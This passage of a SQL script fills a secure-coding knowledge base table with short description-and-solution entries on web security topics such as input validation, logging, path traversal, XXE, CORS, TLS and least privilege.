the application should beNEWLINElogged and rejected by your application.NEWLINENEWLINENote: All this validation and rejection should always be performed on the server side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input rejectionNEWLINE- Client side validationNEWLINE- Single input validation controlsNEWLINE', 'Input validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single input validation controlsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEInput validation refers to the process of validating all the input to an applicationNEWLINEbefore using it. Input validation is absolutely critical to application security,NEWLINEand most application risks involve tainted input at some level.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a single input validation control is used by the application for eachNEWLINEtype of data that is accepted. This way your validation controls stay clear, transparentNEWLINEand manageable. This method leaves less room for error.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Client side input validationNEWLINE- Character encodingNEWLINE', 'Single input validation controls'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging validation failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you log all the input validation failures in your application you can discover in anNEWLINEearly stage that your application is under attack and take quick countermeasures againstNEWLINEthe attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all input validation failures are logged in order to counter possible attacksNEWLINEin an early stage. Also you want to verify that error handling logic in security controlsNEWLINEdenies access by default.NEWLINE', 'Logging validation failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging implemented on the server-sideNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELogging should always be implemented on the server-side since an attacker otherwise NEWLINEmanipulate the functionality and erase his traces.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all logging controls are implemented on the server-side.NEWLINE', 'Logging implemented on the serverside'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging guidelinesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe logging should contain some guidelines in order to organize your logging file in suchNEWLINEa way it becomes clear and easy to find informationNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe logging file should at least contain, a timestamp from a reliable source, severityNEWLINElevel of the event, an indication that this is a security relevant eventNEWLINE(if mixed with other logs), the identity of the user that caused the eventNEWLINE(if there is a user associated with the event), the source IP address of the requestNEWLINEassociated with the event, whether the event succeeded or failed, and aNEWLINEdescription of the event. Also verify that log fields from trusted and untrusted sourcesNEWLINEare distinguishable in log entries, preferably stored in different files so they cannotNEWLINEtaint each other whenever log injection occurs.NEWLINENEWLINEVerify accessing sensitive data is logged, if the data is collected under relevant data protectionNEWLINEdirectives or where logging of accesses is required.NEWLINE', 'Logging guidelines'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('Not available itemNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis item is currently not available.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis item is currently not available.NEWLINE', 'not available item'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Filename Injection / Path TraversalNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA Path Traversal attack aims to access files and directories that are stored outsideNEWLINEthe web root folder. By browsing the application, the attacker looks for absolute linksNEWLINEto files stored on the web server.  By manipulating variables that reference files withNEWLINEdot-dot-slash (../); sequences and its variations, it may be possible to access arbitraryNEWLINEfiles and directories stored on file system, including application source code,configurationNEWLINEand critical system files, limited by system operational access control.NEWLINENEWLINEThe attacker uses ../../ sequences to move up to root directory, thus permitting navigationNEWLINEthrough the file system. This attack can be executed with an external malicious code injectedNEWLINEon the path, like the Resource Injection attack.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe most effective solution to eliminate file inclusion vulnerabilities is to avoid passingNEWLINEuser-submitted input to any filesystem/framework API. If this is not possible the applicationNEWLINEcan maintain a white list of files, that may be included by the page, and then use an identifierNEWLINE(for example the index number) to access to the selected file. Any request containing an invalidNEWLINEidentifier has to be rejected, in this way there is no attack surface for malicious users toNEWLINEmanipulate the path.NEWLINE', 'Filename injection Path traversel'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# External DTD parsingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEProcessing of an external entity containing tainted data may lead to disclosure ofNEWLINEconfidential information and other system impacts.NEWLINEThe XML 1.0 standard defines the structure of an XML document.NEWLINEThe standard defines a concept called an entity, which is a storage unit of some type.NEWLINEThere exists a specific type of entity, an external general parsed entity often shortenedNEWLINEto an external entity, that can access local or remote content via a declared systemNEWLINEidentifier. The system identifier is assumed to be a URI that can be dereferencedNEWLINE(accessed) by the XML processor when processing the entity.NEWLINENEWLINEThe XML processor thenNEWLINEreplaces occurrences of the named external entity with the contents dereferenced by theNEWLINEsystem identifier. If the system identifier contains tainted data and the XML processorNEWLINEdereferences this tainted data, the XML processor may disclose confidential informationNEWLINEnormally not accessible by the application. Attacks can include disclosing local files,NEWLINEwhich may contain sensitive data such as passwords or private user data,NEWLINEusing file: schemes or relative paths in the system identifier.NEWLINENEWLINESince the attack occurs relative to the application processing the XML document,NEWLINEan attacker may use this trusted application to pivot to other internal systems,NEWLINEpossibly disclosing other internal contentNEWLINEvia http(s) requests. In some situations, an XML processor library that is vulnerableNEWLINEto client-side memory corruption issues may be exploited by dereferencing a malicious URI,NEWLINEpossibly allowing arbitrary code execution under the application account. Other attacksNEWLINEcan access local resources that may not stop returning data, possibly impacting applicationNEWLINEavailability if too many threads or processes are not released.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the XML DTD parsing. This can be set when initiating the XML parser.NEWLINE', 'External DTD parsing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELog injection problems are a subset of injection problem, in which invalid entries takenNEWLINEfrom user input are inserted in logs or audit trails, allowing an attacker to misleadNEWLINEadministrators or cover traces of attack. Log injection can also sometimes be used toNEWLINEattack log monitoring systems indirectly by injecting data that monitoring systems willNEWLINEmisinterpret.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEYou should consider these three controls when implementing logging systems.NEWLINENEWLINE- Design: If at all possible, avoid logging data that came from external inputs.NEWLINENEWLINE- Implementation: Ensure that all log entries are statically created, or if they mustNEWLINErecord external data that the input is vigorously white-list checked.NEWLINENEWLINE- Run time: Avoid viewing logs with tools that may interpret control characters in theNEWLINEfile, such as command-line shells.NEWLINENEWLINEAlso verify that all non-printable symbols and field separators are properly encoded in log entries,NEWLINEto prevent log injection.NEWLINE', 'Log injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# CA certificatesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn cryptography, a certificate authority or certification authority (CA) is an entity thatNEWLINEissues digital certificates. A digital certificate certifies the ownership of a public keyNEWLINEby the named subject of the certificate. Sometimes it happens that a CA goes bad and isNEWLINErevoked from the browser. This will lead to untrusted TLS connections if your applicationNEWLINEuses an issued certificate from this CA.NEWLINENEWLINE## Solution:NEWLINENEWLINEIt''s always a good idea to let multiple CA you trust create a certificate,NEWLINEbest way is that you create yourself the key pair (pub & priv) and let the CA sign it.NEWLINEThis way you don''t need to ''leak'' your priv key and you have backup trustedNEWLINEcertificates you can use as a backup when one goes ''bad''.NEWLINE', 'CA certificates'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All connections should be TLSNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application provides TLS, all connections should be TLS otherwise theNEWLINEencryption will be lost.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that TLS is used for all connectionsNEWLINE(including both external and backend connections) that are using authentication tokens orNEWLINEthat involve sensitive data or functions.NEWLINEThis should also be enforced in the application itself wherever possible,NEWLINEfor example: Secure flags on cookies, HSTS, certificate pinning etc.NEWLINE', 'All connections should be TLS'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Log TLS connection failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEFailing TLS connections should always be logged. This is a great indicator that ''something'' is wrong.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that backend TLS connection failures are logged.NEWLINE', 'Log TLS connection failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Content type headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESetting the right content headers is important for hardening your applications security,NEWLINEthis reduces exposure to drive-by download attacks or sites serving user uploadedNEWLINEcontent that, by clever naming could be treated by MS Internet Explorer as executable orNEWLINEdynamic HTML files and thus can lead to security vulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn example of a content type header would be:  NEWLINENEWLINE    Content-Type: text/html; charset=UTF-8NEWLINE    or:NEWLINE    Content-Type: application/json;NEWLINE', 'Content type headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Malicious intentNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEBefore pushing a code live you should check the software for malicious code in order toNEWLINEmake sure no developers with evil intent made backdoors or deliberately put in exploits.NEWLINEThe same goes for whenever you are using third-part software and components.NEWLINENEWLINEAlso verify, that third party components come from trusted repositories.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINERunning your code through a static code analyzer or auditing tools could give you a changeNEWLINEto find malicious pieces of code which could be embedded into the software.NEWLINEAlso if the new or adjusted functionality is critical then check manually it in the formNEWLINEof a code review for back doors, Easter eggs, and logic flaws.NEWLINENEWLINEThis should also mean that authorized administrators must have the capability to verify the integrity ofNEWLINEall security-relevant configurations to ensure that they have not been tampered with.NEWLINE', 'Malicious intent'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SandboxingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA sandbox is a security mechanism for separating running programs.NEWLINEIt is often used to execute untested code, or untrusted programs fromNEWLINEunverified third parties, suppliers, untrusted users and untrusted websites. It''s creatingNEWLINEan extra layer of security where an attacker first need to break out from.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse the sandbox attribute of an iframe for untrusted content. The sandbox attribute of anNEWLINEiframe enables restrictions on content within a iframe. The following restrictions areNEWLINENEWLINEActive when the sandbox attribute is set:NEWLINENEWLINE- All markup is treated as being from a unique originNEWLINE- All forms and scripts are disabled.NEWLINE- All links are prevented from targeting other browsing contextsNEWLINE- All features that triggers automatically are blockedNEWLINE- All plugins are disabledNEWLINENEWLINEIt is possible to have a fine-grained control over iframe capabilities using the value ofNEWLINEthe sandbox attribute. In old versions of user agents where this feature is not supported,NEWLINEthis attribute will be ignored. Use this feature as an additional layer of protection orNEWLINEcheck if the browser supports sandboxed frames and only show the untrustedNEWLINEcontent if supported. Apart from this attribute, to prevent Clickjacking attacks andNEWLINEunsolicited framing it is encouraged to use the header X-Frame-Options which supportsNEWLINEthe deny and same-origin values. Other solutions like framebusting:NEWLINENEWLINE```javascriptNEWLINEif(window!== window.top) { window.top.location = location; }NEWLINE#Only for legacy browser supportNEWLINE```NEWLINE', 'Sandboxing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Repudiation attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEA repudiation attack happens when an application or system does not adopt controls toNEWLINEproperly track and log users actions, thus permitting malicious manipulation or forgingNEWLINEthe identification of new actions. This attack can be used to change the authoringNEWLINEinformation of actions executed by a malicious user in order to log wrong data to log files.NEWLINEIts usage can be extended to general data manipulation in the name of others,NEWLINEin a similar manner as spoofing mail messages. If this attack takes place, the data storedNEWLINEon log files can be considered invalid or misleading.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis type of data should always be processed out of reach of the user and should beNEWLINEverified and enforced server-side.NEWLINE', 'Repudiation attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Server-side validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application is processing high value business logic parameters these valuesNEWLINEshould always be processed out of reach of the users and validated against expectedNEWLINEvalues on the server.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application does not allow high value business logic parameters to beNEWLINEtampered with. The users should not be able to have control over this value, recommendedNEWLINEis to process this data server-side and validate the data to see if it returns expectedNEWLINEvalues. If not these failures should be logged.NEWLINENEWLINEAlso important to always verify that the same access control rules implied by the presentation layerNEWLINEare enforced on the server-side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Single input validation classNEWLINE- Character encodingNEWLINE- Client side input validationNEWLINE', 'Server side validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Privilege escalationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn every portion of the application where a user can create information in the databaseNEWLINE(e.g., making a payment, adding a contact, or sending a message), then he can receiveNEWLINEinformation (statement of account, order details, etc.), or delete informationNEWLINE(drop users, messages, etc.), it is necessary to record that functionality.NEWLINEThe tester should try to access such functions as another user in order to verify if it isNEWLINEpossible to access a function that should not be permitted by the users role/privilegeNEWLINE(but might be permitted as another user).NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEChecking if a user has enough authorization to execute certain request should always beNEWLINEenforced on the server-side. Also you may to apply the Principle of Least privilege,NEWLINEthe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINEFor example, if a user server only requires access to the network, read access to aNEWLINEdatabase table, and the ability to write to a log, this describes all the permissionsNEWLINEthat should be granted. Under no circumstances should the user be granted administrativeNEWLINEprivileges. Also for making testing easier you can create Unit-tests that verifies theNEWLINEuser role permissions.NEWLINE', 'Privilege escalation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# LDAP injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELDAP Injection is an attack used to exploit web based applications thatNEWLINEconstruct LDAP statements based on user input. When an application fails to properlyNEWLINEsanitise user input, it is possible to modify LDAP statements using a local proxy.NEWLINEThis could result in the execution of arbitrary commands such as granting permissions toNEWLINEunauthorised queries, and content modification inside the LDAP tree.NEWLINEThe same advanced exploitation techniques available in SQL Injection can be similarlyNEWLINEapplied in LDAP Injection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe best way to prevent LDAP injection is to use a positive validation scheme for ensuringNEWLINEthat the data going into your queries does not contain any attacks. However, in some cases,NEWLINEit is necessary to include special characters in input that is passed into an LDAP query.NEWLINEIn this case, using escaping can prevent the LDAP interpreter from thinking those specialNEWLINEcharacters are actually LDAP query.NEWLINE', 'LDAP injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Enforce sequential step orderNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an functionality consists out of following several steps to achieve some goal i.e,NEWLINENEWLINEUser adds items to chart -> User enters shipping information -> User pays for goods -> Items will be shipped.NEWLINEYou want to make sure the user can not skip the payment step in order to receive his goods.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to verify that this stage was run through by a sincere user you want to enforceNEWLINEthe application to only process business logic flows in sequential step order, with allNEWLINEsteps being processed in realistic human time, and not process out of order, skipped steps,NEWLINEprocessed steps from another user, or too quickly submitted transactions.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Aggregate user requestsNEWLINE- CSRF injectionNEWLINE', 'Enforce sequential step order'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Step up or adaptive authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user browses a section of a web based application that contains sensitiveNEWLINEinformation the user should be challenged authenticate again using a higher assuranceNEWLINEcredential to be granted access to this information.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has additional authorizationNEWLINE(such as step up or adaptive authentication) so the user is challenged before beingNEWLINEgranted access to sensitive information. This rule also applies for making criticalNEWLINEchanges to an account or action.NEWLINENEWLINEThis also means that the adaptation of authentication hasNEWLINEto be implemented in such a manner that the application correctly enforces context-sensitiveNEWLINEauthorization so as to not allow unauthorized manipulation by means of in example, parameter tampering.NEWLINE', 'step up or adaptive authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Cross origin resource sharingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINECross Origin Resource Sharing or CORS is a mechanism that enables a web browser to performNEWLINE''cross-domain'' requests using the XMLHttpRequest L2 API in a controlled manner.NEWLINEIn the past, the XMLHttpRequest L1 API only allowed requests to be sent within the sameNEWLINEorigin as it was restricted by the same origin policy.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINECross-Origin requests have an Origin header, that identifies the domain initiating theNEWLINErequest and is always sent to the server. CORS defines the protocol to use between a webNEWLINEbrowser and a server to determine whether a cross-origin request is allowed. In order toNEWLINEaccomplish this goal, there are a few HTTP headers involved in this process,NEWLINEthat are supported by all major browsers:NEWLINENEWLINE- OriginNEWLINE- Access-Control-Request-MethodNEWLINE- Access-Control-Request-HeadersNEWLINE- Access-Control-Allow-OriginNEWLINE- Access-Control-Allow-CredentialsNEWLINE- Access-Control-Allow-MethodsNEWLINE- Access-Control-Allow-HeadersNEWLINENEWLINEThings you must consider when using CORSNEWLINENEWLINE1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to beNEWLINEcross domain; this behavior can lead to code injection by a remote attacker. Pay extraNEWLINEattention to absolute URLs.NEWLINENEWLINE2. Ensure that URLs responding with Access-Control-Allow-Origin: * do not include anyNEWLINEsensitive content or information that might aid attacker in further attacks.NEWLINEUse the Access-Control-Allow-Origin header only on chosen URLs that need to beNEWLINEaccessed cross-domain. Don''t use the header for the whole domain.NEWLINENEWLINE3. Allow only selected, trusted domains in the Access-Control-Allow-Origin header.NEWLINEPrefer white-listing domains over blacklisting or allowing any domainNEWLINE(do not use * wildcard nor blindly return the Origin header content without any checks)NEWLINENEWLINE4. Keep in mind that CORS does not prevent the requested data from going to anNEWLINEunauthenticated location. It''s still important for the server to perform usualNEWLINECSRF prevention.NEWLINENEWLINE5. While the RFC recommends a pre-flight request with the OPTIONS verb, currentNEWLINEimplementations might not perform this request, so it''s important that "ordinary"NEWLINE(GET and POST) requests perform any access control necessary.NEWLINENEWLINE6. Discard requests received over plain HTTP with HTTPS origins to prevent mixedNEWLINEcontent bugs.NEWLINENEWLINE7. Don''t rely only on the Origin header for Access Control checks. Browser always sendsNEWLINEthis header in CORS requests, but may be spoofed outside the browser.NEWLINEApplication-level protocols should be used to protect sensitive data.NEWLINENEWLINE**NOTE:** Always make sure that even though you have set the allow origin header to trusted sources, youNEWLINEhave to make authentication/session management before displaying sensitive information.NEWLINE', 'Cross origin resource sharing'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Prevent password leakingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an users password is displayed on screen or send by email, an attacker gains theNEWLINEopportunity of compromising the password since it is displayed or sent in plain text.NEWLINESince the password is displayed on screen it could even be copied simply by looking at it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever display passwords on screen in an unprotected matter since this could easily leadNEWLINEto the password being compromised.NEWLINESome practices are for you to:NEWLINENEWLINE- set input field type to password.NEWLINE- Set autocomplete=off for the password input field.NEWLINENEWLINEThis turns off the auto complete and remember password features of the browser.NEWLINENEWLINE## NOTE:NEWLINEFor some browsers this means you have to put all the input fields the form containsNEWLINEto autocomplete=off, otherwise it will not comply.NEWLINENEWLINEAlso whenever a user has the opportunity to use password forget functionsNEWLINEyou should send a reset link rather than a new auto-generated password.NEWLINE', 'Prevent password leaking'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# All authentication controls must fail securelyNEWLINE-------NEWLINENEWLINE## Description:NEWLINEHandling errors securely is a key aspect of secure coding.NEWLINEThere are two types of errors that deserve special attention. The first is exceptionsNEWLINEthat occur in the processing of a security control itself. It''s important that theseNEWLINEexceptions do not enable behavior that the countermeasure would normally not allow.NEWLINEAs a developer, you should consider that there are generally three possible outcomesNEWLINEfrom a security mechanism:NEWLINENEWLINE1. allow the operationNEWLINE2. disallow the operationNEWLINE3. exceptionNEWLINENEWLINEIn general, you should design your security mechanism so that a failure will follow the same execution pathNEWLINEas disabling the operationNEWLINENEWLINE## Solution:NEWLINENEWLINEMake sure all the access control systems are thoroughly tested for failing securely beforeNEWLINEusing it in your application. It is common that complete unit-test are created especiallyNEWLINEfor this purpose.NEWLINE', 'All authentication controls must fail securely'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forget password functionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user forgets his password and your application provides a passwordNEWLINEforget functionality or any other type of recovery pathsNEWLINEthere are a couple of things to take into consideration when you want to harden itsNEWLINEsecurity.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe forget password function should never send a new password by email but should containNEWLINEa reset link with a token which is valid for a limited amount of time.NEWLINEAdditional authentication based on soft-tokensNEWLINE(e.g. SMS token, native mobile applications, etc.) can be required as well before theNEWLINElink is sent over. Also make sure whenever such a recovery cycle is started, theNEWLINEapplication does not reveal the users current password in any way.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Prevent password leakingNEWLINE- Disallow the use of old passwordsNEWLINE- Predictable password and/or token generationNEWLINE', 'Forget password functions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate access control protectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINE Verify the system can protect against aggregation or continuous access ofNEWLINE secured functions, resources, or data. For example, possibly by the use of aNEWLINE resource governor to limit the number of edits per hour or to prevent the entire databaseNEWLINE from being scraped by an individual user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe system should contain a counter which can keep up with the number of times a certainNEWLINEusers addresses database tables and should be rejected when he passes a reasonable number.NEWLINEThis violation should also be reported since it could indicate an attacker scraping yourNEWLINEtable contents and stealing company information.NEWLINE', 'Aggregate access control protection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Canonicalization of user inputNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever user-input is partially validated there is a high probability that the applicationNEWLINEmisses a malicious input which could execute into a successful attack on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll user-input should be validated whenever the user-input string is complete and is beingNEWLINEprocessed by your application.NEWLINE', 'Canonicalized user input'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Approved random number generatorNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe lack of entropy available for, or used by, a pseudo-random number generator can be aNEWLINEstability and security threat.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAll random numbers, random file names, random GUIDs, and random must be generated usingNEWLINEthe cryptographic module''s approved random number generator when these random values areNEWLINEintended to be unguessable/unpredictable by an attacker.NEWLINE', 'Approved random number generator'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Validated cryptographic modulesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe National Institute of Standards and Technology (NIST) issued the FIPS 140 PublicationNEWLINESeries to coordinate the requirements and standards for cryptography modules that includeNEWLINEboth hardware and software components. Protection of a cryptographic module within aNEWLINEsecurity system is necessary to maintain the confidentiality and integrity of theNEWLINEinformation protected by the module.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that cryptographic modules used by the application have been validated againstNEWLINEFIPS 140-2 or an equivalent standard.NEWLINE', 'Validated cryptographic modules'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# SSI injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWeb servers usually give developers the ability to add small pieces of dynamic code insideNEWLINEstatic HTML pages, without having to deal with full-fledged server-sideNEWLINEor client-side languages.NEWLINENEWLINEThis feature is incarnated by the Server-Side Includes (SSI).NEWLINEThe attacker will try to inject code into the application that willNEWLINEbe interpreted by SSI mechanisms. A successful exploitation of this vulnerabilityNEWLINEallows an attacker to inject code into HTML pages or even perform remote code execution.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe SSI handler on the web-server should not be activated when it is not used.NEWLINE', 'SSI injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Policy for managing cryptographic keysNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen there is no policy for managing your cryptographic keys, expired or revoked keysNEWLINEthat could unknowingly be used again thus becoming a threat for your encrypted data.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is an explicit policy for how cryptographic keys are managedNEWLINE(e.g., generated, distributed, revoked, expired). Verify that this policy is properlyNEWLINEenforced.NEWLINE', 'Policy for managing cryptographic keys'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HTTPS and weakly or unencrypted linksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEImagine the scenario where you have a login form and an application which supports HTTPS.NEWLINEWhenever the initial connection (login.php) is not HTTPS and after login (loggedin.php)NEWLINEwill be HTTPS the username and password will not be send through an encrypted manner thusNEWLINEcould be easily compromised by attackers. This principle also applies to sendingNEWLINEvulnerable data towards other unencrypted/weak encrypted links in your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDo not traverse unencrypted or weakly encrypted links.NEWLINEAs soon as you allow a single connection to be send over unencrypted lines, theNEWLINEintegrity and confidentiality of your data can no longer be guaranteed.NEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- HTTP strict transport securityNEWLINE- HSTS preloadNEWLINE', 'HTTPS and weakly or unencrypted links'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Error handling on trusted devicesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever error handling is not applied through trusted devices the errors it supplies canNEWLINEnot be trusted since they can be tampered with.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all error handling is performed on trusted devices.NEWLINE', 'Error handling on trusted devices'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single application-level loggingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application contains a single application-level logging implementation itNEWLINEbecomes clear, transparent and easy to maintain. It also reduces the possibility that youNEWLINEoverlook high priority logging.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that there is a single application-level logging implementation that is used byNEWLINEthe software.NEWLINE', 'Single application level logging'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Aggregate user requestsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEVerify the system can protect against aggregation or continuous access to functions,  NEWLINEresources, or data. For example, possibly by the use of a resource governor to limit theNEWLINEnumber of edits per minute in order to to prevent an automatic attackNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify the application has the ability to detect and alert on abnormal numbers of requestsNEWLINEfor information or processing high value transactions for that user role, such as screenNEWLINEscraping, automated use of web service extraction, or data loss prevention. For example,NEWLINEthe average user should not be able to access more than 5 records per hour or 30 recordsNEWLINEper day, or add 10 friends to a social network per minute.NEWLINE', 'Aggregate user requests'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Principle of least privilegeNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe principle of least privilege recommends that accounts have the least amount ofNEWLINEprivilege required to perform their business processes. This encompasses user rights,NEWLINEresource permissions such as CPU limits, memory, network, and file system permissions.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe principle means giving a user account only those privileges which are essential toNEWLINEthat users work. For example, a backup user does not need to install software: hence,NEWLINEthe backup user has rights only to run backup and backup-related applications.NEWLINEAny other privileges, such as installing new software, are blocked.NEWLINENEWLINEThe principle applies also to a personal computer user who usually does work in a normalNEWLINEuser account, and opens a privileged, password protected account (that is, a superuser)NEWLINEonly when the situation absolutely demands it.NEWLINENEWLINEThis principle can also be applied to your web-applications. Instead of solely dependingNEWLINEon role based authentication methods using sessions, we rather want to assign privilegesNEWLINEto users by means of a Database-Based Authentication system.NEWLINENEWLINEWe still use sessions in order to identify if the user was logged in correctly, only nowNEWLINEinstead of assigning that user with a specific role we assign him with privileges toNEWLINEverify which actions he is privileged to perform on the system.NEWLINENEWLINEAlso a big pro of this method is, whenever a user has to be assigned less privilegesNEWLINEyour changes will be applied on the fly since the assigning does not depend on the sessionNEWLINEwhich otherwise had to expire first.NEWLINE', 'Principle of least privilege'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# TLS implementation must operate in an approved mode of operationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo enforce the maximum amount of security out of the TLS implementation it should alwaysNEWLINEsuffice the approved mode of operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESee See http://csrc.nist.gov/groups/STM/cmvp/documents/fips140-2/FIPS1402IG.pdfNEWLINEfor more extended details on how to reach this goal.NEWLINE', 'TLS implementation must operate in an approved mode of operation'); 
